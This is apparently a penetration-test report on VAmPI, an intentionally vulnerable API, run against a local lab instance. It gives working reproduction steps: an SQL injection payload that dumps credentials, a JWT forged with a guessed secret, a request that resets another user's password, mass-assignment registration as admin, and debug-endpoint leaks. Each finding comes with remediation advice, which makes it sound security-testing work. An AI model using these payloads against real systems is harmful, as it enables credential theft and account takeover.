# Vulnerability Assessment — VAmPI (`http://172.17.0.2:5000`)

## Executive Summary

An authorized black-box test of the VAmPI instance confirmed six exploitable flaws, four of them Critical. Unauthenticated SQL injection dumps the entire credential store in cleartext, a weak/guessable JWT signing secret (`random`) lets an attacker forge admin tokens, a broken object-authorization check lets any low-privilege user reset the administrator's password, and a debug endpoint hands out every password without authentication. Any one of these yields full application and data compromise; chained, they give trivial, repeatable admin takeover.

| # | Finding | Severity | CWE |
|---|---------|----------|-----|
| 1 | SQL injection in `GET /users/v1/{username}` | Critical | CWE-89 |
| 2 | Forgeable JWT — weak signing secret (`random`) | Critical | CWE-347 / CWE-798 |
| 3 | BOLA — any user resets admin's password | Critical | CWE-639 |
| 4 | Mass assignment — self-register as admin | High | CWE-915 |
| 5 | Excessive data exposure — unauth `/_debug` leaks cleartext passwords | High | CWE-200 |
| 6 | Security misconfiguration — Werkzeug debug mode leaks source & console secret | High | CWE-489 |

---

### 1. SQL Injection in `GET /users/v1/{username}` allows unauthenticated dump of all credentials

- **Severity:** Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8)
- **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
- **Affected asset:** `http://172.17.0.2:5000/users/v1/{username}` — `username` path parameter
- **Summary:** The username path segment is concatenated directly into a raw SQL string, so an unauthenticated attacker can read arbitrary database contents, including every user's password.
- **Steps to Reproduce:**
  1. Send a UNION-based payload in the path (5 columns, confirmed by column-count probing where `cols=5` returned a valid JSON body and other counts errored):
     ```
     GET /users/v1/qwe' UNION SELECT id,group_concat(username||':'||password),3,4,5 FROM users-- -
     ```
  2. Observed response:
     ```json
     {"username": "name1:pass1,name2:pass2,admin:pass1", "email": "4"}
     ```
  3. Root cause is visible in the leaked source (Finding 6): `models/user_model.py:73` builds
     `user_query = f"SELECT * FROM users WHERE username = '{username}'"` and executes it via `db.session.execute(text(user_query))`.
- **Impact:** Complete read of the backend database with no authentication — full credential theft (`admin:pass1`), enabling downstream account takeover. Injection also reaches DML in principle (integrity/availability), hence C/I/A High.
- **Remediation:** Use parameterized/bound queries or the ORM query API; never interpolate user input into SQL text.
- **References:** https://cwe.mitre.org/data/definitions/89.html · OWASP API8:2023 Security Misconfiguration / OWASP Top 10 A03:2021 Injection

---

### 2. Forgeable JWT via weak signing secret (`random`) allows full admin impersonation

- **Severity:** Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8)
- **CWE:** CWE-347 (Improper Verification of Cryptographic Signature) / CWE-798 (Use of Hard-coded Credentials)
- **Affected asset:** Session/JWT auth across `http://172.17.0.2:5000/users/v1/*` (HS256 bearer tokens)
- **Summary:** Auth tokens are signed with the trivially guessable secret `random`, so anyone can mint a valid token for any user — including the administrator — and perform admin-only actions.
- **Steps to Reproduce:**
  1. Register/login as any user to obtain a sample token, then brute-force the HS256 secret offline (HMAC-SHA256 over `header.payload` compared to the signature):
     ```
     JWT SECRET FOUND: random
     ```
  2. Forge an admin token (`{"sub":"admin"}`) signed with `random`:
     ```
     eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJleHAiOiAxNzg5Njk0ODIzLCAiaWF0IjogMTc4OTY5MTIyMywgInN1YiI6ICJhZG1pbiJ9.gpMHgppPOktY_Oopale8KSj5HHTzIZ__0iw_bJbD3qo
     ```
  3. Use it against an admin-gated endpoint that a genuine non-admin was denied:
     ```
     DELETE /users/v1/bob   Authorization: Bearer <forged>
     → {"message": "User deleted.", "status": "success"}
     ```
- **Impact:** Complete authentication bypass and privilege escalation to admin, enabling deletion/modification of any user and any admin-only operation. (Token lifetime is also only 60s, and identity rests solely on `sub` — secondary weaknesses.)
- **Remediation:** Generate a long, high-entropy per-deployment secret from a secrets manager and rotate it; reject weak/default secrets. Consider asymmetric (RS/ES) signing.
- **References:** https://cwe.mitre.org/data/definitions/347.html · https://cwe.mitre.org/data/definitions/798.html · OWASP API2:2023 Broken Authentication

---

### 3. Broken Object Level Authorization in `PUT /users/v1/{username}/password` allows any user to reset the admin's password

- **Severity:** Critical — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8)
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **Affected asset:** `http://172.17.0.2:5000/users/v1/{username}/password`
- **Summary:** The password-change handler trusts the `username` in the URL instead of the authenticated token subject, so any logged-in user can overwrite any other account's password — including the administrator's — and take it over.
- **Steps to Reproduce:**
  1. Register a low-privilege user `bob` and log in to get his token.
  2. Send, as `bob`:
     ```
     PUT /users/v1/admin/password
     Authorization: Bearer <bob token>
     Content-Type: application/json
     {"password":"hacked123"}
     ```
     → `204` (empty success body).
  3. Confirm via `/_debug`:
     ```
     [{'admin': True, 'email': 'admin@mail.com', 'password': 'hacked123', 'username': 'admin'}]
     ```
- **Impact:** Full account takeover of any user, including admin, from an ordinary authenticated account.
- **Remediation:** Enforce `token.sub == {username}` (or an explicit admin role) server-side before mutating; do not derive the target account from the URL alone.
- **References:** https://cwe.mitre.org/data/definitions/639.html · OWASP API1:2023 Broken Object Level Authorization

---

### 4. Mass Assignment in `POST /users/v1/register` allows self-provisioning of an admin account

- **Severity:** High — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (8.1)
- **CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
- **Affected asset:** `http://172.17.0.2:5000/users/v1/register`
- **Summary:** Registration binds client-supplied fields directly to the user object, so an attacker can set `admin:true` at signup and obtain administrative privileges.
- **Steps to Reproduce:**
  1. Register with an extra `admin` field:
     ```
     POST /users/v1/register
     {"username":"pwn","password":"pwn","email":"pwn@x.com","admin":true}
     → {"message": "Successfully registered. ...", "status": "success"}
     ```
  2. Confirm via `/_debug`:
     ```
     [{'admin': True, 'email': 'pwn@x.com', 'password': 'pwn', 'username': 'pwn'}]
     ```
- **Impact:** Direct, unauthenticated privilege escalation to admin.
- **Remediation:** Allow-list accepted registration fields (username, password, email only); set `admin` server-side, never from request body.
- **References:** https://cwe.mitre.org/data/definitions/915.html · OWASP API6:2023 (Mass Assignment / BOPLA)

---

### 5. Excessive Data Exposure — unauthenticated `/_debug` returns all users with cleartext passwords

- **Severity:** High — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5)
- **CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor); passwords also stored in cleartext (CWE-256)
- **Affected asset:** `http://172.17.0.2:5000/users/v1/_debug`
- **Summary:** An unauthenticated endpoint dumps every user record, including plaintext passwords and admin flags, handing an attacker the full credential set directly.
- **Steps to Reproduce:**
  1. `GET /users/v1/_debug` (no auth) →
     ```json
     {"users":[{"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"}, ... {"admin":true,"email":"admin@mail.com","password":"pass1","username":"admin"}]}
     ```
- **Impact:** Full credential disclosure without authentication; the cleartext storage means a single leak compromises all accounts.
- **Remediation:** Remove the debug route entirely; never return password fields; store passwords using a strong adaptive hash (bcrypt/argon2).
- **References:** https://cwe.mitre.org/data/definitions/200.html · https://cwe.mitre.org/data/definitions/256.html · OWASP API3:2023

---

### 6. Security Misconfiguration — Werkzeug debug mode leaks source code and console secret

- **Severity:** High — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5)
- **CWE:** CWE-489 (Active Debug Code) / CWE-16 (Configuration)
- **Affected asset:** Application-wide error handling (`Server: Werkzeug/2.2.3`); any error-triggering request, e.g. a malformed SQLi payload to `/users/v1/{username}`
- **Summary:** The interactive Werkzeug debugger is enabled in a production-style deployment, so any exception returns full stack traces, application source, file paths, and the debugger console `SECRET`.
- **Steps to Reproduce:**
  1. Trigger an error, e.g.:
     ```
     GET /users/v1/qwe' UNION SELECT username,password FROM users-- -
     ```
  2. Response is an HTML Werkzeug traceback exposing source of `/vampi/api_views/users.py` and `/vampi/models/user_model.py`, dependency paths, and:
     ```
     SECRET = "M9GPCuPoXoKMX5GQqsS0";  EVALEX = true, EVALEX_TRUSTED = false
     ```
- **Impact:** Source-code and internal-path disclosure that directly aids exploitation of the other findings; leaked debugger secret is a serious hardening failure and RCE surface (interactive console is currently PIN-gated via `EVALEX_TRUSTED=false`, which is the only thing preventing arbitrary code execution here).
- **Remediation:** Run with `debug=False` in any non-local environment; serve generic error pages; ensure the debugger is never network-reachable.
- **References:** https://cwe.mitre.org/data/definitions/489.html · OWASP API8:2023 Security Misconfiguration

---

### Positive controls (verified, not vulnerable)
- `DELETE /users/v1/{username}` correctly enforces admin-only ("Only Admins may delete users!") for a genuine non-admin token — the risk is the *forgeable/escalatable identity* feeding it (Findings 2/4), not the check.
- `PUT /users/v1/{username}/email` updated the token's own user rather than the URL-named target — no BOLA on that endpoint.

### Remediation priority
Fix **#1 (SQLi)**, **#2 (JWT secret)**, and **#3 (BOLA)** first — each independently yields full compromise, and #2→admin DELETE plus #1→credential dump were both demonstrated end to end.

### Coordinated Disclosure
This assessment was performed against an authorized, self-owned instance. All state changes (test users, one password change, one delete of a self-created test user) were reverted via `/createdb`. Findings should be remediated before any public disclosure; a standard 90-day disclosure window from the date of this report is recommended, with no public detail released before a fix is deployed and verified.